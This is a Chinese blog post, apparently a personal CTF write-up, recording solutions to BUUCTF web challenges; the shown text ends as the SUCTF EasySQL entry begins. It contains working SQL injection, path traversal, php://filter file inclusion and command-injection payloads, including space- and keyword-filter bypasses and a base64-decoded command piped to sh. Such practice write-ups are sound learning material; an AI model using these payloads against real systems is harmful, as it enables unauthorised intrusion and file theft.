<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Buuctf做题记录 - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="Buuctf做题记录">
<meta property="og:description" content="2024.12.2正式开启buuctf题目，此文为记录"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-12-02T13:28:33+08:00"><meta property="article:modified_time" content="2024-12-02T13:28:33+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="Buuctf做题记录"><meta name=twitter:description content="2024.12.2正式开启buuctf题目，此文为记录"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/><link rel=prev href=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Buuctf做题记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/wp\/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95\/"},"genre":"posts","keywords":"buuctf, wp","wordcount":3634,"url":"https:\/\/nexuzzz0.github.io\/posts\/wp\/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95\/","datePublished":"2024-12-02T13:28:33+08:00","dateModified":"2024-12-02T13:28:33+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i>
</span></span><a href=javascript:void(0); class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/friend/ title=Friend>友链</a><a class=menu-item href=/about/ title=About>关于</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#极客大挑战-2019easysql>[极客大挑战 2019]EasySQL</a></li><li><a href=#极客大挑战-2019havefun>[极客大挑战 2019]Havefun</a></li><li><a href=#hctf-2018warmup>[HCTF 2018]WarmUp</a></li><li><a href=#actf2020-新生赛include>[ACTF2020 新生赛]Include</a></li><li><a href=#actf2020-新生赛exec>[ACTF2020 新生赛]Exec</a></li><li><a href=#gxyctf2019ping-ping-ping>[GXYCTF2019]Ping Ping Ping</a><ul><li><a href=#法1变量覆盖>法1——变量覆盖</a></li><li><a href=#法2base64>法2——base64</a></li><li><a href=#法3骚操作>法3——骚操作</a></li></ul></li><li><a href=#suctf-2019easysql>[SUCTF 2019]EasySQL</a><ul><li><a href=#法1>法1</a></li><li><a href=#法2>法2</a></li></ul></li><li><a href=#强网杯-2019随便注>[强网杯 2019]随便注</a><ul><li><a href=#法1handler>法1——handler</a></li><li><a href=#法2rename>法2——rename</a></li><li><a href=#法3预处理>法3——预处理</a></li></ul></li><li><a href=#极客大挑战-2019lovesql>[极客大挑战 2019]LoveSQL</a></li><li><a href=#极客大挑战-2019secret>[极客大挑战 2019]Secret</a></li><li><a href=#极客大挑战-2019http>[极客大挑战 2019]Http</a></li><li><a href=#极客大挑战-2019upload>[极客大挑战 2019]Upload</a></li><li><a href=#极客大挑战-2019knife>[极客大挑战 2019]Knife</a></li><li><a href=#actf2020-新生赛upload>[ACTF2020 新生赛]Upload</a></li><li><a href=#极客大挑战-2019babysql>[极客大挑战 2019]BabySQL</a></li><li><a href=#极客大挑战-2019php>[极客大挑战 2019]PHP</a></li><li><a href=#actf2020-新生赛backupfile>[ACTF2020 新生赛]BackupFile</a></li><li><a href=#roarctf-2019easy-calc>[RoarCTF 2019]Easy Calc</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Buuctf做题记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-1212-212>2021-1212-212</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2021-1212-212>2021-1212-212</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3634 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#极客大挑战-2019easysql>[极客大挑战 2019]EasySQL</a></li><li><a href=#极客大挑战-2019havefun>[极客大挑战 2019]Havefun</a></li><li><a href=#hctf-2018warmup>[HCTF 2018]WarmUp</a></li><li><a href=#actf2020-新生赛include>[ACTF2020 新生赛]Include</a></li><li><a href=#actf2020-新生赛exec>[ACTF2020 新生赛]Exec</a></li><li><a href=#gxyctf2019ping-ping-ping>[GXYCTF2019]Ping Ping Ping</a><ul><li><a href=#法1变量覆盖>法1——变量覆盖</a></li><li><a href=#法2base64>法2——base64</a></li><li><a href=#法3骚操作>法3——骚操作</a></li></ul></li><li><a href=#suctf-2019easysql>[SUCTF 2019]EasySQL</a><ul><li><a href=#法1>法1</a></li><li><a href=#法2>法2</a></li></ul></li><li><a href=#强网杯-2019随便注>[强网杯 2019]随便注</a><ul><li><a href=#法1handler>法1——handler</a></li><li><a href=#法2rename>法2——rename</a></li><li><a href=#法3预处理>法3——预处理</a></li></ul></li><li><a href=#极客大挑战-2019lovesql>[极客大挑战 2019]LoveSQL</a></li><li><a href=#极客大挑战-2019secret>[极客大挑战 2019]Secret</a></li><li><a href=#极客大挑战-2019http>[极客大挑战 2019]Http</a></li><li><a href=#极客大挑战-2019upload>[极客大挑战 2019]Upload</a></li><li><a href=#极客大挑战-2019knife>[极客大挑战 2019]Knife</a></li><li><a href=#actf2020-新生赛upload>[ACTF2020 新生赛]Upload</a></li><li><a href=#极客大挑战-2019babysql>[极客大挑战 2019]BabySQL</a></li><li><a href=#极客大挑战-2019php>[极客大挑战 2019]PHP</a></li><li><a href=#actf2020-新生赛backupfile>[ACTF2020 新生赛]BackupFile</a></li><li><a href=#roarctf-2019easy-calc>[RoarCTF 2019]Easy Calc</a></li></ul></nav></div></div><div class=content id=content><p>2024.12.2正式开启buuctf题目，此文为记录</p><h2 id=极客大挑战-2019easysql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019easysql class=header-mark></a>[极客大挑战 2019]EasySQL</h2><p>直接万能密码<code>1' or 1=1#</code></p><h2 id=极客大挑战-2019havefun class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019havefun class=header-mark></a>[极客大挑战 2019]Havefun</h2><p>源代码最后发现<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338210.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338210.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338210.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338210.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338210.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338210.png 2x" sizes=auto alt=image.png></a></figure></p><p><code>?cat=dog</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338255.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338255.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338255.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338255.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338255.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021338255.png 2x" sizes=auto alt=image.png></a></figure></p><h2 id=hctf-2018warmup class=headerLink><a href=#hctf-2018warmup class=header-mark></a>[HCTF 2018]WarmUp</h2><p>源代码提示 source.php 进去看看是<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021341864.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021341864.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021341864.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021341864.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021341864.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021341864.png 2x" sizes=auto alt=image.png></a></figure>查看 hint.php 发现 flag 在 ffffllllaaaagggg</p><p>分析一下 source.php 的代码</p><p>定义了一个名为emmm的类，在该类中有一个静态方法checkFile用于检查要包含的文件是否在白名单中，白名单是一个关联数组$whitelist，其中包含了允许包含的文件的键值对。在代码中，允许包含的文件有"source"=>&ldquo;source.php"和"hint&rdquo;=>&ldquo;hint.php&rdquo;</p><p>还要检查传入的$page参数是否为字符串类型，如果不是或者未设置，将输出"you can&rsquo;t see it"并返回false</p><p>接下来，它检查传入的$page是否直接在白名单中存在，如果存在，返回true。<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359158.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359158.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359158.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359158.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359158.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359158.png 2x" sizes=auto alt=image.png></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359473.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359473.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359473.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359473.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359473.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021359473.png 2x" sizes=auto alt=image.png></a></figure></p><p>然后它会对<code>$page</code>参数进行一系列处理：首先使用<code>mb_strpos</code>找到<code>$page</code>中第一个问号的位置，然后使用<code>mb_substr</code>函数将问号之前的部分作为<code>$_page</code>进行处理。</p><p><strong>注意：我们始终是在source.php页面下进行的传参操作，目的是利用include函数将flag文件包含出来，不要被这里的白名单搞混了。</strong></p><p>让我们来分析一下传入这个东西后，php代码是如何进行判断的：</p><p>传入<code>file=hint.php</code>，首先检查&rsquo;<code>hint.php</code>&lsquo;是否是一个字符串，它是字符串，条件通过；</p><p>检查&rsquo;<code>hint.php</code>&lsquo;是否在白名单中（白名单包括<code>hint.php</code>和<code>source.php</code>），在，继续执行后面的代码；</p><p>对&rsquo;<code>hint.php</code>&lsquo;执行<code>mb_substr</code>函数，但是函数内一个参数是来自另一个函数<code>mb_strpos</code>的返回值，因此我们先看<code>mb_strpos</code>函数，使用<code>.</code>进行字符连接，即连接了一个问号字符 &lsquo;<code>?</code>&rsquo;，得到<code>hint.php?</code></p><p>然后查找&rsquo;<code>?</code>&lsquo;在字符串&rsquo;<code>hint.php?</code>&lsquo;中第一次出现的位置，从0开始算，返回8，即length=8</p><p>接下来我们执行<code>mb_substr</code>函数，即 <code>mb_substr('hint.php',0,8)</code></p><p>从字符串中的第一个字符处开始，返回8个字符，其实还是返回的<code>hint.php</code>；</p><p>然后对返回的内容进行url解码，重复执行上面的检查和截取操作。</p><p>我们只需要传入一个在白名单内的文件名（<code>source.php</code>或者<code>hint.php</code>），并添加上问号，这样可以保证每次找去用于检查的内容都在白名单，返回true。</p><p>构造payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>source</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>file</span><span class=o>=</span><span class=nx>hint</span><span class=o>.</span><span class=nx>php</span><span class=o>?/../../../../</span><span class=nx>ffffllllaaaagggg</span>
</span></span></code></pre></div><p>或者用</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>source</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>file</span><span class=o>=</span><span class=nx>source</span><span class=o>.</span><span class=nx>php</span><span class=o>?/../../../../</span><span class=nx>ffffllllaaaagggg</span>
</span></span></code></pre></div><h2 id=actf2020-新生赛include class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9binclude class=header-mark></a>[ACTF2020 新生赛]Include</h2><p>直接文件包含
<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h2 id=actf2020-新生赛exec class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bexec class=header-mark></a>[ACTF2020 新生赛]Exec</h2><p>简单命令执行
<code>1; cat /flag</code></p><h2 id=gxyctf2019ping-ping-ping class=headerLink><a href=#gxyctf2019ping-ping-ping class=header-mark></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开题目只有一个<code>/?ip=</code>，随便输入<code>1</code>发现<code>ping</code>命令回显，那么后端很可能通过<strong>PHP</strong>接受了<strong>ip</strong>参数，并且拼接到了最终执行的命令中，形成了<code>ping -c $ip</code>，这样就可能存在一个命令注入漏洞</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412226.png title=92160cbeb40697568b6070e2e406035a_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412226.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412226.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412226.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412226.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412226.png 2x" sizes=auto alt=92160cbeb40697568b6070e2e406035a_MD5></a></figure></p><p>直接输入<code>?ip=1;ls</code>发现有回显，说明存在命令注入漏洞</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412227.png title=7517f362952ca8758c3b5a4d0f210383_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412227.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412227.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412227.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412227.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412227.png 2x" sizes=auto alt=7517f362952ca8758c3b5a4d0f210383_MD5></a></figure></p><p>直接读取<code>?ip=1;tac flag.php</code>发现<strong>空格</strong>被过滤，尝试替换空格</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412228.png title=4edbcea4db1a36e0897410e3543ded96_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412228.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412228.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412228.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412228.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412228.png 2x" sizes=auto alt=4edbcea4db1a36e0897410e3543ded96_MD5></a></figure></p><p>用<code>%09</code>代替<strong>空格</strong>，发现不让用，再尝试别的</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412229.png title=522d67e8cd2ab18bcc0b759b02e887ae_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412229.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412229.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412229.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412229.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412229.png 2x" sizes=auto alt=522d67e8cd2ab18bcc0b759b02e887ae_MD5></a></figure></p><p>用<code>$IFS$9</code>,出现<code>flag</code>过滤，尝试各种绕过，发现都不行</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412230.png title=da1fca12d8a6f3cd89da78b207615df4_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412230.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412230.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412230.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412230.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412230.png 2x" sizes=auto alt=da1fca12d8a6f3cd89da78b207615df4_MD5></a></figure></p><p>好好好！这样是吧，那我看源码</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412231.png title=2f599ec9f0bf911b925e6a8a30418edb_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412231.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412231.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412231.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412231.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412231.png 2x" sizes=auto alt=2f599ec9f0bf911b925e6a8a30418edb_MD5></a></figure></p><p>但是貌似不全，可能是因为其他原因导致，<code>Ctrl+U</code>看源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/?ip=
</span></span><span class=line><span class=cl>&lt;pre&gt;PING 1 (0.0.0.1): 56 data bytes
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>  print_r($a);
</span></span><span class=line><span class=cl>  echo &#34;&lt;pre&gt;&#34;;
</span></span><span class=line><span class=cl>  $a = shell_exec(&#34;ping -c 4 &#34;.$ip);
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>    die(&#34;fxck your flag!&#34;);
</span></span><span class=line><span class=cl>  } else if(preg_match(&#34;/.*f.*l.*a.*g.*/&#34;, $ip)){
</span></span><span class=line><span class=cl>    die(&#34;fxck your bash!&#34;);
</span></span><span class=line><span class=cl>  } else if(preg_match(&#34;/bash/&#34;, $ip)){
</span></span><span class=line><span class=cl>    die(&#34;fxck your space!&#34;);
</span></span><span class=line><span class=cl>  } else if(preg_match(&#34;/ /&#34;, $ip)){
</span></span><span class=line><span class=cl>    die(&#34;fxck your symbol!&#34;);
</span></span><span class=line><span class=cl>    echo preg_match(&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&#34;|\\|\(|\)|\[|\]|\{|\}/&#34;, $ip, $match);
</span></span><span class=line><span class=cl>  if(preg_match(&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&#34;|\\|\(|\)|\[|\]|\{|\}/&#34;, $ip, $match)){
</span></span><span class=line><span class=cl>  $ip = $_GET[&#39;ip&#39;];
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;ip&#39;])){
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>/?ip=
</span></span></code></pre></div><h3 id=法1变量覆盖 class=headerLink><a href=#%e6%b3%951%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96 class=header-mark></a>法1——变量覆盖</h3><p><strong>payload：</strong></p><p><code>?ip=1;a=g;tac$IFS$9fla$a.php</code></p><p>或者</p><p><code>?ip=1;a=f;d=ag;c=l;tac$IFS$9$a$c$d.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412232.png title=a7e215670dbf95ec612c014bf932dd66_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412232.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412232.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412232.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412232.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412232.png 2x" sizes=auto alt=a7e215670dbf95ec612c014bf932dd66_MD5></a></figure></p><h3 id=法2base64 class=headerLink><a href=#%e6%b3%952base64 class=header-mark></a>法2——base64</h3><p>源码看到过滤了<code>bash</code>，就用<code>sh</code></p><p><strong>payload：</strong></p><p><code>?ip=1;echo$IFS$9dGFjIGZsYWcucGhw|base64$IFS$9-d|sh</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412233.png title=b8c63ea7f86684dae505d071ef06889e_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412233.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412233.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412233.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412233.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021412233.png 2x" sizes=auto alt=b8c63ea7f86684dae505d071ef06889e_MD5></a></figure></p><h3 id=法3骚操作 class=headerLink><a href=#%e6%b3%953%e9%aa%9a%e6%93%8d%e4%bd%9c class=header-mark></a>法3——骚操作</h3><p>直接将当前目录下所有文件全部tac出来</p><p><strong>payload：</strong></p><pre tabindex=0><code>?ip=1;tac$IFS$9`ls`
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021413523.png title=f49e9afc082802d8d4e39775892031d1_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021413523.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021413523.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021413523.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021413523.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021413523.png 2x" sizes=auto alt=f49e9afc082802d8d4e39775892031d1_MD5></a></figure></p><h2 id=suctf-2019easysql class=headerLink><a href=#suctf-2019easysql class=header-mark></a>[SUCTF 2019]EasySQL</h2><p>fuzz一下，发现过滤挺多<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021423318.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021423318.png><img loading=lazy 